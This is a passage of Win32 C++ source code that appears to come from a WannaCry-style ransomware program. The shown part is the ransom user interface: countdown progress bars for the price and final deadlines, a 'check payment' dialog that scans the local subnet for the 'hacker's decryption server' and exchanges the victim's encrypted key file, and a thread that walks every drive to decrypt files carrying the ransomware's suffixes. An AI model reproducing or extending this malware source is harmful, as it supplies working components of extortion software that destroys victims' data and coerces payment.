						_T("Congratulations"), MB_OK);
					break;
				}
				DialogBox(hInst,
					MAKEINTRESOURCE(IDD_DIALOG2),
					hWnd,
					CheckPaymentDialog);
				break;
			case IDM_ABOUT:
                DialogBox(hInst,
					MAKEINTRESOURCE(IDD_ABOUTBOX),
					hWnd,
					About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
            default:
                return DefWindowProc(hWnd,
					message, wParam, lParam);
            }
        }

        break;
    case WM_PAINT:
        {
			PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: Add any drawing code that uses hdc here...
			HPEN hPenWhite = CreatePen(PS_SOLID, 1,
				RGB(0xFF, 0xFF, 0xFF));
			SelectObject(hdc, hPenWhite);
			Rectangle(hdc, 34, 4, 89 + 34, 84 + 4);
			// draw bitmaps
			DrawBitmapByID(hdc, IDB_BITMAP1,
				35, 5, 87, 82, 124, 124);
			DrawBitmapByID(hdc, IDB_BITMAP2,
				160, 288, 91, 33, 135, 52);
			// draw progressbar
			if (TimeLeft2 >= 0) {
				DrawProgressBar(hdc, 141, 114, 11, 56,
					TimeLeft2 * 100 / PRICE_COUNTDOWN);
			}
			if (TimeLeft1 >= 0) {
				DrawProgressBar(hdc, 141, 210, 11, 56,
					TimeLeft1 * 100 / FINAL_COUNTDOWN);
			}
			// end
			EndPaint(hWnd, &ps);
	}
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}


/////////////////////////////////////////////////////////////////////////
// Connect to hacker's decryption server to get decrypted private key
/////////////////////////////////////////////////////////////////////////

typedef struct {
	HWND hWndParent; // send message from decryption thread to dialog
	HANDLE hEvent; // event from dialog to decryption thread
	DWORD nCommand;
	BOOL bResult;
} SEARCHSRV;

DWORD WINAPI ConnectDecryptServer(
	SEARCHSRV* ss)
{
	char ip[32];
	INT i1, i2, i3, i4;
	SOCKET sock;
	BOOL iResult;
	WSADATA wsaData;
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		DEBUG("client: WSAStartup failed with error: %d\n",
			iResult);
		return FALSE;
	}
	GetLocalIP(ip, sizeof(ip));
	sscanf_s(ip, "%d.%d.%d.%d", &i1, &i2, &i3, &i4);
	for (INT i = 0; i < 255; i++) {
		SendMessage(
			ss->hWndParent,
			WM_USER,
			IDI_INDEX,
			MAKELPARAM(0, i));
		WaitForSingleObject(ss->hEvent, INFINITE);
		if (ss->nCommand == IDC_DECRYPT_STOP) {
			break;
		}
		sprintf_s(ip, sizeof(ip), "%d.%d.%d.%d",
			i1, i2, i3, i);
		sock = CreateSocket(ip, DECRYPT_SERVER_PORT);
		if (sock != INVALID_SOCKET) {
			// do something here
			TCHAR BasePath[MAX_PATH];
			TCHAR szEKYFile[MAX_PATH];
			TCHAR szDKYFile[MAX_PATH];
			UCHAR EKYBuffer[1024];
			UCHAR DKYBuffer[1024];
			ULONG cbEKYBuffer = 0;
			INT cbDKYBuffer = 0;
			ULONG cbWrite = 0;
			BOOL bResult = FALSE;
			HRESULT result = SHGetFolderPath(
				NULL,
				CSIDL_PERSONAL,
				NULL,
				SHGFP_TYPE_CURRENT,
				BasePath);
			_tcscat_s(BasePath, MAX_PATH, _T("\\"));
			_tcscat_s(BasePath, MAX_PATH, BASE_DIRNAME);
			_stprintf_s(szEKYFile, MAX_PATH,
				_T("%s\\%08x.eky"), BasePath, 0);
			_stprintf_s(szDKYFile, MAX_PATH,
				_T("%s\\%08x.dky"), BasePath, 0);
			ReadBuffer(szEKYFile, { 0 }, 0,
				EKYBuffer, sizeof(EKYBuffer), &cbEKYBuffer);
			bResult = SendAll0(sock,
				(char *) EKYBuffer, cbEKYBuffer, 0);
			bResult = RecvAll0(sock,
				(char *) DKYBuffer, sizeof(DKYBuffer),
				&cbDKYBuffer, 0);
			WriteBuffer(szDKYFile,
				{ 0 }, 0,
				DKYBuffer, cbDKYBuffer, &cbWrite);
			if (cbDKYBuffer == cbWrite) {
				ss->bResult = TRUE;
			}
			// end
			closesocket(sock);
			break;
		}
	}
	WSACleanup();
	return 0;
}

DWORD WINAPI CheckPaymentThread(LPVOID p)
{
	SEARCHSRV* ss = (SEARCHSRV*)p;
	DWORD bResult = ConnectDecryptServer(ss);
	SendMessage(ss->hWndParent,
		WM_USER, IDI_DECRYPTED_DONE, 0);
	ExitThread(bResult);
}

INT_PTR CALLBACK CheckPaymentDialog(
	HWND hDlg,
	UINT message,
	WPARAM wParam,
	LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	static HWND hWndPB;
	static HANDLE hThread = NULL, hTimer;
	static SEARCHSRV ServerInfo;
	static CRITICAL_SECTION CriticalSection;
	switch (message)
	{
	case WM_INITDIALOG:
		hWndPB = GetDlgItem(hDlg,
			IDC_CHECKPAYMENTPROGRESS);
		SendMessage(hWndPB,
			PBM_SETRANGE, 0, MAKELPARAM(0, 255));
		SendMessage(hWndPB,
			PBM_SETSTEP, (WPARAM)1, 0);
		SetTimer(hDlg,
			IDT_TIMER3,
			500,
			(TIMERPROC)NULL);
		InitializeCriticalSection(&CriticalSection);
		ServerInfo.hWndParent = hDlg;
		ServerInfo.nCommand = IDC_DECRYPT_START;
		ServerInfo.bResult = FALSE;
		ServerInfo.hEvent = CreateEvent(
			NULL,
			FALSE,
			FALSE,
			NULL);
		if (!ServerInfo.hEvent) {
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		hThread = CreateThread(
			NULL,
			0,
			(LPTHREAD_START_ROUTINE)& CheckPaymentThread,
			&ServerInfo,
			0,
			NULL);

		return (INT_PTR)TRUE;
	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK ||
			LOWORD(wParam) == IDCANCEL)
		{
			if (ServerInfo.hEvent) {
				ServerInfo.nCommand = IDC_DECRYPT_STOP;
				SetEvent(ServerInfo.hEvent);
			}
			DeleteCriticalSection(&CriticalSection);
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	case WM_TIMER:
	{
		DWORD dwResult;
		if (wParam == IDT_TIMER3)
		{
			EnterCriticalSection(&CriticalSection);
			if (hThread) {
				dwResult = WaitForSingleObject(hThread, 0);
				if (dwResult == WAIT_OBJECT_0) {
					CloseHandle(hThread);
					hThread = NULL;
					CloseHandle(ServerInfo.hEvent);
					ServerInfo.hEvent = NULL;
					if (ServerInfo.bResult) {
						MessageBox(hDlg,
							_T("Congratulations! Your payment has ")
							_T("been checked!\nStart decrypting now!"),
							_T("Message"), MB_OK);
					}
					else {
						MessageBox(hDlg,
							_T("Failed to check your payment!\n")
							_T("Please make sure that your computer")
							_T("is connected to the Internet and \n")
							_T("your Internet Service Provider (ISP)")
							_T("does not block connections to the Network!"),
							_T("Decryption Server not Found"), MB_OK);
					}
					DeleteCriticalSection(&CriticalSection);
					EndDialog(hDlg, LOWORD(wParam));
					return (INT_PTR)TRUE;
				}
			}
			LeaveCriticalSection(&CriticalSection);
			return 0;
		}
	}
	break;
	case WM_USER:
		switch (wParam) {
		case IDI_INDEX:
			if (ServerInfo.hEvent) {
				INT nIndex = HIWORD(lParam);
				SendMessage(hWndPB,
					PBM_SETPOS, (WPARAM)nIndex, 0);
				SetEvent(ServerInfo.hEvent);
			}
			break;
		case IDI_DECRYPTED_DONE:
			SendMessage(hWndPB,
				PBM_SETPOS, (WPARAM)255, 0);
			break;
		}
	}
	return (INT_PTR)FALSE;
}

/////////////////////////////////////////////////////////////////////////
// Decryption dialog, show the decryption progress
/////////////////////////////////////////////////////////////////////////

// Buffer and communication between Decryption Dialog and Decryption Thread

typedef struct {
	HWND hWndParent; // send message from decryption thread to dialog
	HANDLE hEvent; // event from dialog to decryption thread
	PWanaDecryptor pDecryptor;
	DWORD nCommand;
	TCHAR szPath[MAX_PATH];
} DECRYPTCOMM;

BOOL DecryptionRecursive(DECRYPTCOMM* dc)
{
	DWORD fattr;
	WIN32_FIND_DATA FindFileData;
	TCHAR szDir[MAX_PATH];
	HANDLE hFind = INVALID_HANDLE_VALUE;
	if (_tcslen(dc->szPath) > (MAX_PATH - 3)) {
		return FALSE;
	}
	if ((fattr = GetFileAttributes(dc->szPath)) ==
		INVALID_FILE_ATTRIBUTES ||
		!(fattr & FILE_ATTRIBUTE_DIRECTORY)) {
		return FALSE;
	}
	if (!dc->pDecryptor) {
		dc->pDecryptor = new WanaDecryptor();
	}
	_stprintf_s(szDir, MAX_PATH, _T("%s\\*"), dc->szPath);
	hFind = FindFirstFile(szDir, &FindFileData);
	if (INVALID_HANDLE_VALUE == hFind) {
		return FALSE;
	}
	_tcscpy_s(szDir, MAX_PATH, dc->szPath);
	SendMessage(dc->hWndParent,
		WM_USER, IDI_DECRYPTED_DIR, 0);
	WaitForSingleObject(dc->hEvent, INFINITE);
	if (dc->nCommand == IDC_DECRYPT_STOP) {
		return TRUE;
	}
	do
	{
		if (_tcscmp(FindFileData.cFileName, _T(".")) &&
			_tcscmp(FindFileData.cFileName, _T(".."))) {
			if (_tcslen(szDir) + 1 +
				_tcslen(FindFileData.cFileName) > (MAX_PATH - 3))
			{
				return FALSE;
			}
			_stprintf_s(dc->szPath, MAX_PATH,
				_T("%s\\%s"), szDir, FindFileData.cFileName);
			if (FindFileData.dwFileAttributes &
				FILE_ATTRIBUTE_DIRECTORY)
			{
				if (_tcscmp(FindFileData.cFileName, _T(".")) &&
					_tcscmp(FindFileData.cFileName, _T(".."))) {
					if (!isIgnorePath(dc->szPath,
						FindFileData.cFileName)) {
						DecryptionRecursive(dc);
					}
				}
			}
			else if (!(FindFileData.dwFileAttributes &
				FILE_ATTRIBUTE_READONLY))
			{
				LPTSTR pSuffix = (LPTSTR)_tcsrchr(
					FindFileData.cFileName,
					_T('.'));
				if (pSuffix) {
					if (!_tcsicmp(pSuffix, WZIP_SUFFIX_CIPHER) ||
						!_tcsicmp(pSuffix, WZIP_SUFFIX_WRITESRC)) {
						if (dc->pDecryptor->Decrypt(dc->szPath)) {
							SendMessage(dc->hWndParent,
								WM_USER, IDI_DECRYPTED_FILE, 0);
							WaitForSingleObject(dc->hEvent, INFINITE);
							if (dc->nCommand == IDC_DECRYPT_STOP) {
								break;
							}
						}
					}
					else if (!_tcsicmp(pSuffix, WZIP_SUFFIX_TEMP)) {
						DeleteFile(dc->szPath);
					}
				}
			}
		}
	} while (FindNextFile(hFind, &FindFileData) != 0);
	FindClose(hFind);
	return TRUE;
}

DWORD WINAPI DecryptionThread(
	DECRYPTCOMM* dc)
{
	TCHAR szRootPathName[16] = ENCRYPT_ROOT_PATH;
	DWORD bResult = TRUE;
	DWORD drivers = GetLogicalDrives();
	for (INT DiskNO = 25;
		DiskNO >= 0 && GetDecryptFlag();
		DiskNO--) {
		drivers = GetLogicalDrives();
		szRootPathName[0] = DiskNO + 65;
		if ((drivers >> DiskNO) & 1) {
			DEBUG("Decrypt: %s\n", szRootPathName);
			_tcscpy_s(dc->szPath, MAX_PATH, szRootPathName);
			bResult = DecryptionRecursive(dc);
		}
	}
	SendMessage(dc->hWndParent,
		WM_USER, IDI_DECRYPTED_DONE, 0);
	ExitThread(bResult);
}

INT_PTR CALLBACK DecryptDialog(
	HWND hDlg,
	UINT message,
	WPARAM wParam,
	LPARAM lParam)
{
	static HWND hWndDecryptPrompt;
	static HWND hWndDecryptListBox;
	static HWND hWndDecryptCombo;
	static HWND hWndDecryptStart;
	static HWND hWndCopyToClipBoard;
	static HWND hwndDecryptClose;
	static HANDLE hThread, hTimer;
	static DECRYPTCOMM DecryptInfo;
	static DWORD nDirs = 0, nFiles = 0;
	static ULONG nFileNameSize = 0;
	static HGLOBAL hMem = NULL;
	static CRITICAL_SECTION CriticalSection;
	TCHAR szMessage[1024] = _T("TEST");
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
	{
		hWndDecryptPrompt = GetDlgItem(hDlg,
			IDC_DECRYPTORPROMPT);
		hWndDecryptListBox = GetDlgItem(hDlg,
			IDC_DECRYPTLIST);
		hWndDecryptCombo = GetDlgItem(hDlg,
			IDC_DECRYPTCOMBO);
		hWndDecryptStart = GetDlgItem(hDlg,
			IDC_DECRYPTSTART);
		hWndCopyToClipBoard = GetDlgItem(hDlg,
			IDC_COPYTOCLIPBOARD);
		hwndDecryptClose = GetDlgItem(hDlg,
			IDC_DECRYPTCLOSE);
		HFONT hFont16B = CreateFont(16, 0, 0, 0,
			FW_BLACK, FALSE, FALSE, FALSE,
			DEFAULT_CHARSET, OUT_OUTLINE_PRECIS,
			CLIP_DEFAULT_PRECIS, CLEARTYPE_QUALITY,
			VARIABLE_PITCH, _T("Arial"));
		SendMessage(hWndDecryptPrompt,
			WM_SETFONT, (WPARAM)hFont16B, TRUE);
		SendMessage(hWndDecryptCombo,
			WM_SETFONT, (WPARAM)hFont16B, TRUE);
		SendMessage(hWndDecryptStart,
			WM_SETFONT, (WPARAM)hFont16B, TRUE);
		SendMessage(hWndCopyToClipBoard,
			WM_SETFONT, (WPARAM)hFont16B, TRUE);
		SendMessage(hwndDecryptClose,
			WM_SETFONT, (WPARAM)hFont16B, TRUE);
		SendMessage(hWndDecryptListBox,
			WM_SETFONT, (WPARAM)hFont16B, TRUE);
		//
		SetTimer(hDlg, IDT_TIMER3, 500, (TIMERPROC)NULL);
		//
		DecryptInfo.hWndParent = hDlg;
		DecryptInfo.pDecryptor = NULL;
		DecryptInfo.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
		DecryptInfo.nCommand = IDC_DECRYPT_START;
		_tcscpy_s(DecryptInfo.szPath, MAX_PATH, _T(""));
		if (!DecryptInfo.hEvent) {
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		InitializeCriticalSection(&CriticalSection);
	}
	return (INT_PTR)TRUE;
	case WM_COMMAND:
		switch (LOWORD(wParam))
		{
		case IDC_DECRYPTSTART:
		{
			if (!hThread) {
				hThread = CreateThread(
					NULL,
					0,
					(LPTHREAD_START_ROUTINE)&DecryptionThread,
					&DecryptInfo,
					0,
					NULL);
				if (hThread == NULL) {
					MessageBox(hDlg,
						_T("Create Decryption Thread Error"),
						_T("Error"), MB_OK);
				}
				SetWindowText(hWndDecryptStart, _T("Stop!"));
			}
			else {
				DecryptInfo.nCommand = IDC_DECRYPT_STOP;
				SetEvent(DecryptInfo.hEvent);
			}
			break;
		}
		case IDC_COPYTOCLIPBOARD:
			if (!hMem) {
				DWORD dwFiles = nFiles;
				DWORD nCch = nFileNameSize + dwFiles * 2 + 10;
				hMem = GlobalAlloc(
					GMEM_MOVEABLE,
					sizeof(TCHAR) * nCch);
				if (hMem) {
					OpenClipboard(hDlg);
					EmptyClipboard();
					LPTSTR aFileNames = (LPTSTR)GlobalLock(hMem);
					aFileNames[0] = _T('\0');
					for (DWORD i = 0; i < dwFiles; i++) {
						TCHAR aFileName[MAX_PATH + 1];
						SendMessage(
							hWndDecryptListBox,
							LB_GETTEXT,	i,
							(LPARAM)aFileName);
						_tcscat_s(aFileNames, nCch, aFileName);
						_tcscat_s(aFileNames, nCch, _T("\r\n"));
					}
					GlobalUnlock(hMem);
					SetClipboardData(CF_UNICODETEXT, hMem);
					CloseClipboard();
					hMem = NULL;
				}
			}
			break;
		case IDC_DECRYPTCLOSE:
			DeleteCriticalSection(&CriticalSection);
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		default:
			return DefWindowProc(hDlg, message, wParam, lParam);
		}
		break;
	case WM_USER:
		switch (wParam) {
		case IDI_DECRYPTED_DIR:
			nDirs++;
			SendMessage(hWndDecryptCombo,
				CB_ADDSTRING, (WPARAM)0,
				(LPARAM)DecryptInfo.szPath);
			SendMessage(hWndDecryptCombo,
				CB_SETCURSEL,
				(WPARAM)(nDirs - 1),
				(LPARAM)0);
			SetEvent(DecryptInfo.hEvent);
			break;
		case IDI_DECRYPTED_FILE:
			nFiles++;
			SendMessage(hWndDecryptListBox,
				LB_ADDSTRING,
				(WPARAM)0,
				(LPARAM)DecryptInfo.szPath);
			SendMessage(hWndDecryptListBox,
				LB_SETCURSEL,
				(WPARAM)(nFiles - 1),
				(LPARAM)0);
			SetEvent(DecryptInfo.hEvent);
			nFileNameSize += (ULONG)_tcslen(DecryptInfo.szPath);
			break;
		case IDI_DECRYPTED_DONE:
			if (hThread) {
				CloseHandle(hThread);
				hThread = NULL;
			}
			SetWindowText(hWndDecryptStart,
				_T("Start"));
			break;
		}
		break;
	case WM_TIMER:
	{
		DWORD dwResult;
		if (wParam == IDT_TIMER3)
		{
			EnterCriticalSection(&CriticalSection);
			if (hThread) {
				dwResult = WaitForSingleObject(hThread, 0);
				if (dwResult == WAIT_OBJECT_0) {
					CloseHandle(hThread);
					hThread = NULL;
					SetWindowText(hWndDecryptStart, _T("Start"));
				}
			}
			LeaveCriticalSection(&CriticalSection);
			return 0;
		}
	}
	break;
	case WM_CTLCOLORSTATIC:
	{
		HDC hdcStatic = (HDC)wParam;
		HWND hWndStatic = (HWND)lParam;
		SetBkColor(hdcStatic, BACKGROUND);
		SetTextColor(hdcStatic, RGB(255, 255, 255));
		return (INT_PTR)((HBRUSH)GetStockObject(NULL_BRUSH));
	}
	break;
	case WM_PAINT:
	{
		PAINTSTRUCT ps;
		HDC hdc = BeginPaint(hDlg, &ps);
		HBRUSH hBrush = CreateSolidBrush(BACKGROUND);
		RECT rect;
		GetClientRect(hDlg, &rect);
		FillRect(hdc, &rect, hBrush);
		EndPaint(hDlg, &ps);
		break;
	}
	case WM_DESTROY:
		DeleteCriticalSection(&CriticalSection);
		EndDialog(hDlg, LOWORD(wParam));
		return (INT_PTR)TRUE;
	}
	return (INT_PTR)FALSE;
}

///////////////////////////////////////////////////////////
// About dialog, create by visual studio as dialog example
///////////////////////////////////////////////////////////

INT_PTR CALLBACK About(
	HWND hDlg,
	UINT message,
	WPARAM wParam,
	LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK ||
			LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}